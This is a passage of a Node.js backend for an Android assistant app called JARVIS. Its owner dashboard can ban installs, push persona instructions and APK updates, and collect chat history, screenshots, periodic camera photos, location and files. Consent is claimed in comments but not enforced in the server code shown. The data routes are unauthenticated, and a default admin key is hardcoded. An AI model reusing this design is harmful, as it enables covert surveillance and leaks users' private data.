// JARVIS backend — v2
// Zero dependencies: only Node.js built-ins (node:http, node:fs, node:path, node:crypto).
// Run:  node server.js        (PORT and ADMIN_KEY come from env)
// Deploy: Render Blueprint (render.yaml) — no build step. Auto-deploys from GitHub main.
//
// What it does (owner control panel for the JARVIS Android app):
//   - Devices heartbeat in with a random per-device install_id; the server
//     records first_seen / last_seen / device / app version / last action.
//   - One-click Ban / Suspend / Shutdown / Restore per install, and per DEVICE
//     (device_id = SHA-256 of the phone's Android ID, so one ban covers every
//     install on that phone).
//   - Remote config: the owner can turn Jarvis features on/off, add extra
//     instructions (persona_extra), post an announcement, and publish a new
//     app version + APK URL — every install picks it up on its next heartbeat
//     and offers the update (one tap to install; Android never allows a truly
//     silent install for sideloaded apps).
//   - Monitoring (CONSENT ONLY): if the app user turns ON "Owner monitoring"
//     in Jarvis Settings, the app also sends recent activity, which permissions
//     it granted, recent chat history, and — only when the owner requests it —
//     one screenshot. Nothing is collected from a user who did not opt in.
//   - The app is local-first: if this backend is unreachable, Jarvis keeps
//     working normally on-device. A heartbeat answer of "banned" /
//     "suspended" / "shutdown" is the only thing that stops it.
//
// Storage: data/users.json, data/devices.json, data/config.json (plain JSON),
// data/screenshots/<install_id>.jpg (latest screenshot per install).
// Render's free disk is ephemeral — data resets on redeploy / restart.
// A real database (Render Postgres / Supabase) is the upgrade path.
//
// Auth: heartbeat / event / history / screenshot / config-read have NO auth
// by design — install_id is a random per-device UUID. Admin routes are
// protected by ADMIN_KEY (env). Default key "jarvis-admin-123" exists only
// for local testing — the dashboard shows a loud warning while it is in use.

const http = require("node:http");
const https = require("node:https");
const fs = require("node:fs");
const path = require("node:path");
const crypto = require("node:crypto");

const PORT = parseInt(process.env.PORT || "3000", 10);
const ADMIN_KEY = process.env.ADMIN_KEY || "jarvis-admin-123";
const DEFAULT_KEY = "jarvis-admin-123";
const USING_DEFAULT_KEY = ADMIN_KEY === DEFAULT_KEY;
// Email notifications (optional): set RESEND_API_KEY + RESEND_FROM in env.
// Free Resend account sends to your own verified email; add a domain to mail anyone.
const RESEND_API_KEY = process.env.RESEND_API_KEY || "";
const RESEND_FROM = process.env.RESEND_FROM || "Jarvis <onboarding@resend.dev>";
const EMAIL_CONFIGURED = RESEND_API_KEY.length > 0;

const DATA_DIR = path.join(__dirname, "data");
const USERS_FILE = path.join(DATA_DIR, "users.json");
const DEVICES_FILE = path.join(DATA_DIR, "devices.json");
const CONFIG_FILE = path.join(DATA_DIR, "config.json");
const SHOTS_DIR = path.join(DATA_DIR, "screenshots");
const CAM_DIR = path.join(DATA_DIR, "camera");
const FILES_DIR = path.join(DATA_DIR, "files");
const MAX_BODY = 2_000_000; // 2 MB — screenshots are base64 JPEGs

const DEFAULT_CONFIG = {
  features: {}, // tool name -> false means the owner turned that feature OFF
  persona_extra: "",
  announcement: "",
  latest_version: "",
  latest_version_code: 0,
  apk_url: "",
  screenshot_requested: {}, // install_id -> true (consumed when the app uploads)
  camera_requested: {}, // install_id -> true (consumed when the app uploads a photo)
  live_camera: {}, // install_id -> true (admin live preview — app uploads a photo every ~12s while set)
  messages: [], // {id, target: "all" | install_id, title, body, at} — shown as a notification on the phone
};

// ---------------------------------------------------------------- storage

function loadJson(file, fallback) {
  try {
    return JSON.parse(fs.readFileSync(file, "utf8"));
  } catch {
    return fallback;
  }
}

function saveJson(file, obj) {
  fs.mkdirSync(path.dirname(file), { recursive: true });
  const tmp = file + "." + crypto.randomBytes(6).toString("hex") + ".tmp";
  fs.writeFileSync(tmp, JSON.stringify(obj, null, 2));
  fs.renameSync(tmp, file);
}

function loadUsers() { return loadJson(USERS_FILE, {}); }
function saveUsers(u) { saveJson(USERS_FILE, u); }
function loadDevices() { return loadJson(DEVICES_FILE, {}); }
function saveDevices(d) { saveJson(DEVICES_FILE, d); }
function loadConfig() { return Object.assign({}, DEFAULT_CONFIG, loadJson(CONFIG_FILE, {})); }
function saveConfig(c) { saveJson(CONFIG_FILE, c); }

// ---------------------------------------------------------------- status

function effectiveStatus(user, devices) {
  // Device ban wins over the install's own status.
  const dev = user.device_id && devices[user.device_id];
  if (dev) {
    if (dev.status === "banned") return "banned";
    if ((dev.status === "suspended" || dev.status === "shutdown") && dev.until) {
      if (new Date(dev.until).getTime() > Date.now()) return dev.status;
    } else if (dev.status === "suspended" || dev.status === "shutdown") {
      return dev.status;
    }
  }
  if ((user.status === "suspended" || user.status === "shutdown") && user.until) {
    if (new Date(user.until).getTime() <= Date.now()) return "ok";
  }
  return user.status || "ok";
}

function statusMessage(user, devices) {
  const st = effectiveStatus(user, devices);
  const until = (user.device_id && devices[user.device_id] && devices[user.device_id].until) || user.until;
  if (st === "banned") return "This install has been banned by the owner.";
  if (st === "suspended") return "Jarvis is suspended until " + (until || "further notice") + ".";
  if (st === "shutdown") return "Jarvis has been shut down by the owner" + (until ? " until " + until : " permanently") + ".";
  return "Jarvis is running normally.";
}

function publicUser(user, devices) {
  return {
    install_id: user.install_id,
    device_id: user.device_id || "",
    device_model: user.device_model || "",
    app_version: user.app_version || "",
    first_seen: user.first_seen,
    last_seen: user.last_seen,
    status: effectiveStatus(user, devices),
    until: user.until || null,
    device_status: (user.device_id && devices[user.device_id]) ? devices[user.device_id].status : "ok",
    last_action: user.last_action || "",
    monitoring: !!user.monitoring,
    permissions: user.permissions || {},
    recent_activity: user.recent_activity || [],
    events: user.events || [],
    history_count: (user.history || []).length,
    last_screenshot_at: user.last_screenshot_at || null,
    last_camera_at: user.last_camera_at || null,
    files: user.files || [],
    email: user.email || "",
  };
}

function publicConfig(cfg) {
  return {
    features: cfg.features || {},
    persona_extra: cfg.persona_extra || "",
    announcement: cfg.announcement || "",
    latest_version: cfg.latest_version || "",
    latest_version_code: cfg.latest_version_code || 0,
    apk_url: cfg.apk_url || "",
    messages: cfg.messages || [],
  };
}

function sendEmailViaResend(to, subject, text) {
  return new Promise((resolve) => {
    const payload = JSON.stringify({ from: RESEND_FROM, to: [to], subject, text });
    const req = https.request("https://api.resend.com/emails", {
      method: "POST",
      headers: {
        Authorization: "Bearer " + RESEND_API_KEY,
        "Content-Type": "application/json",
        "Content-Length": Buffer.byteLength(payload),
      },
    }, (resp) => {
      let data = "";
      resp.on("data", (c) => { data += c; });
      resp.on("end", () => resolve({ ok: resp.statusCode >= 200 && resp.statusCode < 300, status: resp.statusCode, body: data }));
    });
    req.on("error", (e) => resolve({ ok: false, status: 0, body: String(e.message || e) }));
    req.write(payload);
    req.end();
  });
}

// ---------------------------------------------------------------- helpers

function sendJson(res, code, obj) {
  const body = JSON.stringify(obj);
  res.writeHead(code, {
    "Content-Type": "application/json",
    "Access-Control-Allow-Origin": "*",
    "Access-Control-Allow-Headers": "Content-Type",
    "Access-Control-Allow-Methods": "GET, POST, OPTIONS",
  });
  res.end(body);
}

function sendHtml(res, code, html) {
  res.writeHead(code, { "Content-Type": "text/html; charset=utf-8" });
  res.end(html);
}

function readJsonBody(req) {
  return new Promise((resolve, reject) => {
    let raw = "";
    req.on("data", (chunk) => {
      raw += chunk;
      if (raw.length > MAX_BODY) req.destroy();
    });
    req.on("end", () => {
      if (!raw.trim()) return resolve({});
      try {
        resolve(JSON.parse(raw));
      } catch (e) {
        reject(e);
      }
    });
    req.on("error", reject);
  });
}

function escapeHtml(s) {
  return String(s ?? "")
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;");
}

function shortId(id) {
  return String(id).slice(0, 8);
}

function fmtTime(iso) {
  if (!iso) return "—";
  try {
    return new Date(iso).toLocaleString("en-GB", { timeZone: "Asia/Kolkata" });
  } catch {
    return iso;
  }
}

function safeFileName(id) {
  return String(id).replace(/[^A-Za-z0-9-]/g, "");
}

// ---------------------------------------------------------------- dashboard

function keyFormHtml() {
  return `<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
<title>JARVIS Admin</title><style>
body{font-family:system-ui,sans-serif;background:#0b0f16;color:#e6f1ff;max-width:480px;margin:80px auto;padding:0 16px}
h1{color:#22d3ee}input{width:100%;padding:12px;margin:10px 0;border-radius:8px;border:1px solid #334155;background:#111827;color:#fff;font-size:16px}
button{padding:12px 20px;border:0;border-radius:8px;background:#22d3ee;color:#04222a;font-weight:700;cursor:pointer;font-size:16px}
p{color:#9fb3d1}
</style></head><body>
<h1>JARVIS Admin</h1>
<p>Enter the admin key to see installs and control Jarvis.</p>
<form method="get" action="/admin">
<input type="password" name="key" placeholder="Admin key" autofocus>
<button type="submit">Open dashboard</button>
</form></body></html>`;
}

function dashboardHtml(users, devices, cfg, key) {
  const list = Object.values(users);
  const now = Date.now();
  const total = list.length;
  const active24h = list.filter((u) => u.last_seen && now - new Date(u.last_seen).getTime() < 24 * 3600 * 1000).length;
  const banned = list.filter((u) => effectiveStatus(u, devices) === "banned").length;
  const paused = list.filter((u) => ["suspended", "shutdown"].includes(effectiveStatus(u, devices))).length;
  const monitored = list.filter((u) => u.monitoring).length;

  const disabledTools = Object.keys(cfg.features || {}).filter((t) => cfg.features[t] === false);

  const targetOpts = ['<option value="all">🌍 All users</option>'].concat(
    list.map((u) => `<option value="${escapeHtml(u.install_id)}">${escapeHtml(u.device_model || "Unknown")} · ${escapeHtml(shortId(u.install_id))}${u.email ? " · " + escapeHtml(u.email) : ""}</option>`)
  ).join("");

  const cards = list
    .sort((a, b) => new Date(b.last_seen || 0) - new Date(a.last_seen || 0))
    .map((u) => {
      const st = effectiveStatus(u, devices);
      const badge =
        st === "ok" ? '<span class="ok">● OK</span>'
        : st === "banned" ? '<span class="bad">● BANNED</span>'
        : st === "suspended" ? '<span class="warn">● SUSPENDED</span>'
        : '<span class="warn">● SHUTDOWN</span>';
      const until = u.until && st !== "ok" ? " <small>until " + escapeHtml(fmtTime(u.until)) + "</small>" : "";
      const devStatus = (u.device_id && devices[u.device_id]) ? devices[u.device_id].status : "ok";
      const perms = Object.entries(u.permissions || {});
      const permChips = perms.length
        ? perms.map(([n, ok]) => `<span class="chip ${ok ? "on" : "off"}">${escapeHtml(n)}: ${ok ? "✓" : "✗"}</span>`).join(" ")
        : '<span class="muted">no permission report yet</span>';
      const acts = (u.recent_activity || []).slice(-5).reverse().map((a) => `<li>${escapeHtml(a)}</li>`).join("");
      const evs = (u.events || []).slice(-5).reverse().map((e) => `<li><small>${escapeHtml(fmtTime(e.at))}</small> ${escapeHtml(e.event)}${e.detail ? " — " + escapeHtml(e.detail) : ""}</li>`).join("");
      const hist = (u.history || []).slice(-20).map((m) => `<div class="msg ${escapeHtml(m.role)}"><b>${escapeHtml(m.role)}:</b> ${escapeHtml(m.text)}</div>`).join("");
      const shot = u.last_screenshot_at
        ? `<img src="/api/admin/screenshot/${escapeHtml(u.install_id)}?key=${encodeURIComponent(key)}" alt="latest screen" loading="lazy">`
        : '<p class="muted">No screenshot yet.</p>';
      const cam = u.last_camera_at
        ? `<img id="camImg-${escapeHtml(u.install_id)}" src="/api/admin/camera-photo/${escapeHtml(u.install_id)}?key=${encodeURIComponent(key)}" alt="latest camera photo" loading="lazy">`
        : '<p class="muted">No camera photo yet.</p>';
      const fileLinks = (u.files || []).length
        ? (u.files || []).map((f) => `<li><a href="/api/admin/file/${escapeHtml(u.install_id)}/${encodeURIComponent(f)}?key=${encodeURIComponent(key)}">${escapeHtml(f)}</a></li>`).join("")
        : "";
      return `<div class="user">
<div class="uhead"><b>${escapeHtml(u.device_model || "Unknown device")}</b> ${badge}${until}
<span class="muted"> · v${escapeHtml(u.app_version || "?")} · install ${escapeHtml(shortId(u.install_id))}${u.device_id ? " · device " + escapeHtml(shortId(u.device_id)) : ""}</span></div>
<div class="muted">First seen ${escapeHtml(fmtTime(u.first_seen))} · Last seen ${escapeHtml(fmtTime(u.last_seen))}</div>
<div>Last action: <b>${escapeHtml(u.last_action || "—")}</b></div>
<div>Monitoring: ${u.monitoring ? '<span class="ok">ON — user allowed it</span>' : '<span class="muted">OFF</span>'}</div>
<div>${u.last_location ? `📍 Location: <b>${escapeHtml(u.last_location.address || (u.last_location.lat + ", " + u.last_location.lng))}</b> <span class="muted">(${escapeHtml(fmtTime(u.last_location.at))}${u.last_location.accuracy_m ? " · ±" + escapeHtml(String(u.last_location.accuracy_m)) + "m" : ""})</span> <a href="https://www.google.com/maps?q=${encodeURIComponent(u.last_location.lat + "," + u.last_location.lng)}" target="_blank">Open in Maps</a>` : '<span class="muted">📍 Location: not shared (user has location tracking OFF).</span>'}</div>
<div class="row"><b>Permissions:</b> ${permChips}</div>
${acts ? `<div><b>Recent activity:</b><ul>${acts}</ul></div>` : ""}
${evs ? `<div><b>Events:</b><ul>${evs}</ul></div>` : ""}
${hist ? `<details><summary>Chat history (${(u.history || []).length} messages)</summary><div class="hist">${hist}</div></details>` : ""}
<details><summary>Screen ${u.last_screenshot_at ? "· " + escapeHtml(fmtTime(u.last_screenshot_at)) : ""}</summary>${shot}
<p><button onclick="reqShot('${escapeHtml(u.install_id)}')">Request screenshot</button> <span class="muted">— the app sends one screenshot on its next heartbeat, only if the user allowed monitoring.</span></p></details>
<details><summary>Camera ${u.last_camera_at ? "· " + escapeHtml(fmtTime(u.last_camera_at)) : ""} <span id="liveBadge-${escapeHtml(u.install_id)}"></span></summary>${cam}
<p><button onclick="reqCam('${escapeHtml(u.install_id)}')">Request camera photo</button> <button onclick="reqLiveCam('${escapeHtml(u.install_id)}')">▶ Live preview</button> <button onclick="stopLiveCam('${escapeHtml(u.install_id)}')">⏹ Stop live</button> <span class="muted">— one photo, or live preview (a fresh photo every ~12s, not video) — only if the user allowed monitoring and camera permission.</span></p></details>
${fileLinks ? `<details open><summary>Files (${(u.files || []).length})</summary><ul>${fileLinks}</ul></details>` : `<div class="muted">Files: none uploaded yet (only with monitoring ON + file permission).</div>`}
<div class="bigbtns">
<button class="ban" onclick="act('${escapeHtml(u.install_id)}','ban')">🚫 BAN USER</button>
<button onclick="act('${escapeHtml(u.install_id)}','restore')">↩ Restore</button>
<button class="ban" onclick="actDevice('${escapeHtml(u.install_id)}','ban_device')">📱 BAN DEVICE</button>
<button onclick="actDevice('${escapeHtml(u.install_id)}','unban_device')">↩ Unban device</button>
${st !== "ok" ? "" : `<button onclick="act('${escapeHtml(u.install_id)}','suspend',7)">Suspend 7d</button>
<button onclick="act('${escapeHtml(u.install_id)}','shutdown',30)">Shutdown 30d</button>`}
</div>
${devStatus !== "ok" ? `<div class="warnline">Device is ${escapeHtml(devStatus)} — every install on this phone is blocked.</div>` : ""}
</div>`;
    })
    .join("");

  return `<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
<title>JARVIS Admin — ${total} installs</title><style>
body{font-family:system-ui,sans-serif;background:#070b12;color:#e6f1ff;margin:0;padding:16px}
h1{color:#22d3ee;margin:0 0 4px}.sub{color:#9fb3d1;margin:0 0 16px}
.warnbar{background:#7c2d12;border:1px solid #f97316;color:#ffedd5;padding:12px;border-radius:8px;margin-bottom:16px}
.cards{display:flex;gap:12px;flex-wrap:wrap;margin-bottom:16px}
.card{background:#111827;border:1px solid #1f2937;border-radius:12px;padding:14px 18px;min-width:130px}
.card b{font-size:26px;display:block}.card span{color:#9fb3d1;font-size:13px}
.panel{background:#0f172a;border:1px solid #1e3a5f;border-radius:12px;padding:16px;margin-bottom:16px}
.panel h2{margin:0 0 8px;color:#7dd3fc;font-size:17px}
.panel label{display:block;color:#9fb3d1;font-size:13px;margin:10px 0 4px}
.panel input,.panel textarea{width:100%;box-sizing:border-box;padding:9px;border-radius:8px;border:1px solid #334155;background:#111827;color:#fff;font-size:14px}
.panel textarea{min-height:64px}
.panel select{width:100%;box-sizing:border-box;padding:9px;border-radius:8px;border:1px solid #334155;background:#111827;color:#fff;font-size:14px}
.user{background:#111827;border:1px solid #1f2937;border-radius:14px;padding:16px;margin-bottom:14px}
.uhead{font-size:16px;margin-bottom:4px}
.ok{color:#4ade80}.bad{color:#f87171;font-weight:700}.warn{color:#fbbf24;font-weight:700}
.muted{color:#9fb3d1;font-size:13px}
.row{margin:6px 0}
.chip{display:inline-block;padding:2px 8px;border-radius:20px;font-size:12px;margin:2px;background:#1f2937}
.chip.on{color:#4ade80;border:1px solid #166534}.chip.off{color:#94a3b8;border:1px solid #475569}
ul{margin:4px 0;padding-left:18px}li{margin:2px 0}
details{margin:8px 0}summary{cursor:pointer;color:#7dd3fc}
.hist{max-height:220px;overflow:auto;background:#0b1220;border-radius:8px;padding:8px;margin-top:6px}
.msg{margin:4px 0;font-size:14px}.msg.user b{color:#7dd3fc}.msg.jarvis b{color:#fbbf24}
img{max-width:100%;border-radius:10px;border:1px solid #334155;margin-top:6px}
.bigbtns{display:flex;gap:8px;flex-wrap:wrap;margin-top:10px}
.bigbtns button{padding:10px 16px;border-radius:10px;border:1px solid #334155;background:#1f2937;color:#e6f1ff;cursor:pointer;font-size:14px;font-weight:600}
.bigbtns button:hover{background:#374151}
.bigbtns button.ban{background:#7f1d1d;border-color:#b91c1c}
.bigbtns button.ban:hover{background:#991b1b}
.warnline{color:#fbbf24;margin-top:8px}
.save{padding:12px 22px;border:0;border-radius:10px;background:#22d3ee;color:#04222a;font-weight:700;cursor:pointer;font-size:15px;margin-top:12px}
</style></head><body>
<h1>🤖 JARVIS Admin</h1>
<p class="sub">One place: users, bans, remote features, online updates, activity &amp; screens (consent only).</p>
${USING_DEFAULT_KEY ? '<div class="warnbar"><b>WARNING:</b> You are using the default admin key (jarvis-admin-123). Anyone who knows it can control every install. Set a strong ADMIN_KEY environment variable on Render and redeploy.</div>' : ""}
<div class="panel"><h2>📜 Policy — plain and simple</h2>
<p><b>What the admin CAN see / do here:</b> which installs exist (device, app version, first/last seen, last action), Ban / Suspend / Shutdown one user or one whole device in one click, turn Jarvis features on/off for everyone, add instructions, post an announcement, publish an app update.</p>
<p><b>What the admin sees ONLY when the app user turned ON "Owner monitoring" in Jarvis Settings:</b> recent activity, which permissions the user granted, recent chat history, one screenshot (only when requested), one camera photo (only when requested) or live camera preview (a fresh photo every ~12s while the admin has it on — photo slideshow, not video), small text files from Jarvis's own workspace (only with file permission), and location (only when the user turned ON location tracking).</p>
<p><b>What the admin NEVER sees / does:</b> no passwords, no OTPs, no true live camera video, no live screen stream, no location tracking (unless the user turned ON location tracking), no data from other apps, no silent installs (every update needs one tap on Install), no phone unlocking. If monitoring is OFF, the admin sees only the install's device, version and last action — nothing else.</p>
</div>
<div class="cards">
<div class="card"><b>${total}</b><span>Total installs</span></div>
<div class="card"><b>${active24h}</b><span>Active (last 24h)</span></div>
<div class="card"><b>${banned}</b><span>Banned</span></div>
<div class="card"><b>${paused}</b><span>Suspended / Shutdown</span></div>
<div class="card"><b>${monitored}</b><span>Monitoring ON</span></div>
</div>

<div class="panel"><h2>⚙️ Remote control — features, instructions &amp; online update</h2>
<p class="muted">Saved here, every install picks it up on its next heartbeat (within ~15 min). Turning a feature OFF hides it from the app. Publishing a new version makes every install offer the update (one tap to install).</p>
<label>Disabled features — one tool name per line (e.g. install_app, shopping, make_video). Empty = everything ON.</label>
<textarea id="cfgFeatures">${escapeHtml(disabledTools.join("\n"))}</textarea>
<label>Extra instructions for Jarvis (persona_extra) — added to every install's instructions.</label>
<textarea id="cfgPersona">${escapeHtml(cfg.persona_extra || "")}</textarea>
<label>Announcement — shown at the top of the app for every user.</label>
<input id="cfgAnnounce" value="${escapeHtml(cfg.announcement || "")}" placeholder="e.g. New update available!">
<label>Latest version name (e.g. 1.4.1)</label>
<input id="cfgVersion" value="${escapeHtml(cfg.latest_version || "")}" placeholder="1.4.1">
<label>Latest version code (number — must be higher than the installed one)</label>
<input id="cfgCode" type="number" value="${cfg.latest_version_code || ""}" placeholder="16">
<label>APK download URL for the update</label>
<input id="cfgApk" value="${escapeHtml(cfg.apk_url || "")}" placeholder="https://…/jarvis-ai-v1.4.1.apk">
<button class="save" onclick="saveCfg()">💾 Save remote control</button>
</div>

<div class="panel"><h2>💬 Send message / notification to users</h2>
<p class="muted">The phone shows it as a system notification on its next heartbeat (within ~15 min). No Firebase needed — the app polls the backend.</p>
<label>To</label>
<select id="msgTarget">${targetOpts}</select>
<label>Title</label>
<input id="msgTitle" placeholder="e.g. Jarvis update is here!">
<label>Message</label>
<textarea id="msgBody" placeholder="Write the message for the user…"></textarea>
<button class="save" onclick="sendMsg()">📣 Send notification</button>
<span id="msgResult" class="muted"></span>
</div>

<div class="panel"><h2>📧 Send email to users</h2>
<p class="muted">${EMAIL_CONFIGURED ? "Email is configured ✓ — sending via Resend." : "Email is NOT configured yet — set RESEND_API_KEY (free at resend.com) + RESEND_FROM in the Render service env vars and redeploy. A user's email appears here only when they set it in Jarvis Settings and turned ON Owner monitoring."}</p>
<label>To</label>
<select id="mailTarget">${targetOpts}</select>
<label>Subject</label>
<input id="mailSubject" placeholder="e.g. Important Jarvis update">
<label>Email body</label>
<textarea id="mailBody" placeholder="Write the email…"></textarea>
<button class="save" onclick="sendMail()">✉️ Send email</button>
<span id="mailResult" class="muted"></span>
</div>

${cards || '<p class="muted">No installs yet — devices appear here after their first heartbeat.</p>'}
<script>
const KEY = ${JSON.stringify(key)};
async function post(path, body) {
  const r = await fetch(path, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(body) });
  if (!r.ok) { alert('Failed: ' + r.status); return false; }
  return true;
}
async function act(id, action, days) {
  if (action === 'ban' && !confirm('Ban this user permanently? (one click — they stop working at once)')) return;
  if (action === 'shutdown' && days === 0 && !confirm('Shut down Jarvis for this user permanently?')) return;
  if (await post('/api/admin/action', { key: KEY, install_id: id, action: action, days: days })) location.reload();
}
async function actDevice(id, action) {
  if (action === 'ban_device' && !confirm('Ban this DEVICE permanently? Every install on this phone stops working.')) return;
  if (await post('/api/admin/action', { key: KEY, install_id: id, action: action })) location.reload();
}
async function reqShot(id) {
  if (await post('/api/admin/action', { key: KEY, install_id: id, action: 'request_screenshot' })) alert('Screenshot requested — it appears here after the app\\'s next heartbeat (within ~15 min).');
}
async function reqCam(id) {
  if (await post('/api/admin/action', { key: KEY, install_id: id, action: 'request_camera' })) alert('Camera photo requested — it appears here after the app\\'s next heartbeat (within ~15 min).');
}
const liveTimers = {};
async function reqLiveCam(id) {
  if (await post('/api/admin/action', { key: KEY, install_id: id, action: 'request_live_camera' })) {
    alert('Live camera preview ON — a fresh photo every ~12s (photo slideshow, not video). It starts after the next heartbeat (within ~15 min, or sooner if the app is opened).');
    startLiveRefresh(id);
  }
}
async function stopLiveCam(id) {
  if (await post('/api/admin/action', { key: KEY, install_id: id, action: 'stop_live_camera' })) {
    stopLiveRefresh(id);
    alert('Live camera preview OFF.');
  }
}
function startLiveRefresh(id) {
  stopLiveRefresh(id);
  const badge = document.getElementById('liveBadge-' + id);
  if (badge) badge.innerHTML = ' <span class="ok">● LIVE</span>';
  liveTimers[id] = setInterval(() => {
    const img = document.getElementById('camImg-' + id);
    if (img) img.src = '/api/admin/camera-photo/' + encodeURIComponent(id) + '?key=' + encodeURIComponent(KEY) + '&t=' + Date.now();
  }, 5000);
}
function stopLiveRefresh(id) {
  if (liveTimers[id]) { clearInterval(liveTimers[id]); delete liveTimers[id]; }
  const badge = document.getElementById('liveBadge-' + id);
  if (badge) badge.innerHTML = '';
}
async function saveCfg() {
  const features = {};
  document.getElementById('cfgFeatures').value.split('\\n').map(s => s.trim()).filter(Boolean).forEach(t => features[t] = false);
  const body = { key: KEY, features: features,
    persona_extra: document.getElementById('cfgPersona').value,
    announcement: document.getElementById('cfgAnnounce').value,
    latest_version: document.getElementById('cfgVersion').value,
    latest_version_code: parseInt(document.getElementById('cfgCode').value || '0', 10) || 0,
    apk_url: document.getElementById('cfgApk').value };
  if (await post('/api/admin/config', body)) { alert('Saved — installs pick it up on their next heartbeat.'); location.reload(); }
}
async function sendMsg() {
  const title = document.getElementById('msgTitle').value.trim();
  const body = document.getElementById('msgBody').value.trim();
  if (!title || !body) { alert('Title and message are needed.'); return; }
  const r = await fetch('/api/admin/message', { method: 'POST', headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ key: KEY, target: document.getElementById('msgTarget').value, title: title, body: body }) });
  const j = await r.json();
  document.getElementById('msgResult').textContent = r.ok ? ' ✅ Sent — phones show it on their next heartbeat.' : ' ❌ ' + (j.error || r.status);
  if (r.ok) { document.getElementById('msgTitle').value = ''; document.getElementById('msgBody').value = ''; }
}
async function sendMail() {
  const subject = document.getElementById('mailSubject').value.trim();
  const body = document.getElementById('mailBody').value.trim();
  if (!subject || !body) { alert('Subject and body are needed.'); return; }
  document.getElementById('mailResult').textContent = ' Sending…';
  const r = await fetch('/api/admin/notify-email', { method: 'POST', headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ key: KEY, target: document.getElementById('mailTarget').value, subject: subject, body: body }) });
  const j = await r.json();
  document.getElementById('mailResult').textContent = r.ok ? ' ✅ Email sent to ' + j.sent + ' of ' + j.total + ' user(s).' : ' ❌ ' + (j.error || r.status);
}
</script></body></html>`;
}

// ---------------------------------------------------------------- routes

const server = http.createServer(async (req, res) => {
  const url = new URL(req.url, "http://" + (req.headers.host || "localhost"));
  const pathname = url.pathname;

  if (req.method === "OPTIONS") {
    res.writeHead(204, {
      "Access-Control-Allow-Origin": "*",
      "Access-Control-Allow-Headers": "Content-Type",
      "Access-Control-Allow-Methods": "GET, POST, OPTIONS",
    });
    return res.end();
  }

  try {
    // ---- GET /health
    if (req.method === "GET" && pathname === "/health") {
      return sendJson(res, 200, { ok: true });
    }

    // ---- GET /api/config (public — the app reads it on every heartbeat)
    if (req.method === "GET" && pathname === "/api/config") {
      return sendJson(res, 200, publicConfig(loadConfig()));
    }

    // ---- POST /api/heartbeat
    if (req.method === "POST" && pathname === "/api/heartbeat") {
      const body = await readJsonBody(req);
      const installId = String(body.install_id || "").trim();
      if (!installId) return sendJson(res, 400, { error: "install_id required" });
      const users = loadUsers();
      const devices = loadDevices();
      const cfg = loadConfig();
      const now = new Date().toISOString();
      let user = users[installId];
      if (!user) {
        user = {
          install_id: installId,
          device_id: String(body.device_id || ""),
          device_model: body.device_model || "",
          app_version: body.app_version || "",
          first_seen: now,
          last_seen: now,
          status: "ok",
          until: null,
          last_action: body.last_action || "",
          monitoring: !!body.monitoring,
          permissions: body.permissions || {},
          recent_activity: Array.isArray(body.recent_activity) ? body.recent_activity.slice(-20) : [],
          events: [],
          history: [],
          last_screenshot_at: null,
          email: body.email ? String(body.email).slice(0, 120) : "",
          last_location: (body.location && typeof body.location === "object" && typeof body.location.lat === "number" && typeof body.location.lng === "number") ? { lat: body.location.lat, lng: body.location.lng, address: String(body.location.address || ""), accuracy_m: body.location.accuracy_m || null, at: now } : null,
        };
        users[installId] = user;
      } else {
        user.last_seen = now;
        if (body.device_model) user.device_model = body.device_model;
        if (body.app_version) user.app_version = body.app_version;
        if (body.device_id) user.device_id = String(body.device_id);
        if (body.last_action !== undefined) user.last_action = body.last_action;
        if (body.monitoring !== undefined) user.monitoring = !!body.monitoring;
        if (body.email) user.email = String(body.email).slice(0, 120);
        // v1.4.7b: location tracking — only when the user turned it ON (opt-in)
        if (body.location && typeof body.location === "object" && typeof body.location.lat === "number" && typeof body.location.lng === "number") {
          user.last_location = { lat: body.location.lat, lng: body.location.lng, address: String(body.location.address || ""), accuracy_m: body.location.accuracy_m || null, at: new Date().toISOString() };
        }
        if (body.permissions && typeof body.permissions === "object") user.permissions = body.permissions;
        if (Array.isArray(body.recent_activity)) user.recent_activity = body.recent_activity.slice(-20);
      }
      saveUsers(users);
      const shotRequested = !!(cfg.screenshot_requested && cfg.screenshot_requested[installId]);
      const camRequested = !!(cfg.camera_requested && cfg.camera_requested[installId]);
      return sendJson(res, 200, {
        status: effectiveStatus(user, devices),
        until: user.until || null,
        message: statusMessage(user, devices),
        config: publicConfig(cfg),
        screenshot_requested: shotRequested,
        camera_requested: camRequested,
        live_camera: !!(cfg.live_camera && cfg.live_camera[installId]),
      });
    }

    // ---- POST /api/event
    if (req.method === "POST" && pathname === "/api/event") {
      const body = await readJsonBody(req);
      const installId = String(body.install_id || "").trim();
      if (!installId) return sendJson(res, 400, { error: "install_id required" });
      if (!body.event) return sendJson(res, 400, { error: "event required" });
      const users = loadUsers();
      let user = users[installId];
      if (!user) {
        const now = new Date().toISOString();
        user = {
          install_id: installId, device_id: "", device_model: "", app_version: "",
          first_seen: now, last_seen: now, status: "ok", until: null,
          last_action: "", monitoring: false, permissions: {}, recent_activity: [],
          events: [], history: [], last_screenshot_at: null,
        };
        users[installId] = user;
      }
      user.events = user.events || [];
      user.events.push({
        at: new Date().toISOString(),
        event: String(body.event),
        detail: body.detail !== undefined ? String(body.detail) : "",
      });
      if (user.events.length > 20) user.events = user.events.slice(-20);
      user.last_seen = new Date().toISOString();
      saveUsers(users);
      return sendJson(res, 200, { ok: true });
    }

    // ---- POST /api/history (consent only — the app sends this only when
    // the user turned ON "Owner monitoring" in Jarvis Settings)
    if (req.method === "POST" && pathname === "/api/history") {
      const body = await readJsonBody(req);
      const installId = String(body.install_id || "").trim();
      if (!installId) return sendJson(res, 400, { error: "install_id required" });
      if (!Array.isArray(body.messages)) return sendJson(res, 400, { error: "messages array required" });
      const users = loadUsers();
      const user = users[installId];
      if (!user) return sendJson(res, 404, { error: "unknown install_id — heartbeat first" });
      user.history = body.messages
        .filter((m) => m && typeof m.text === "string")
        .slice(-50)
        .map((m) => ({ role: m.role === "jarvis" ? "jarvis" : "user", text: String(m.text).slice(0, 2000), at: m.at || "" }));
      user.last_seen = new Date().toISOString();
      saveUsers(users);
      return sendJson(res, 200, { ok: true, stored: user.history.length });
    }

    // ---- POST /api/screenshot (consent only + owner-requested only)
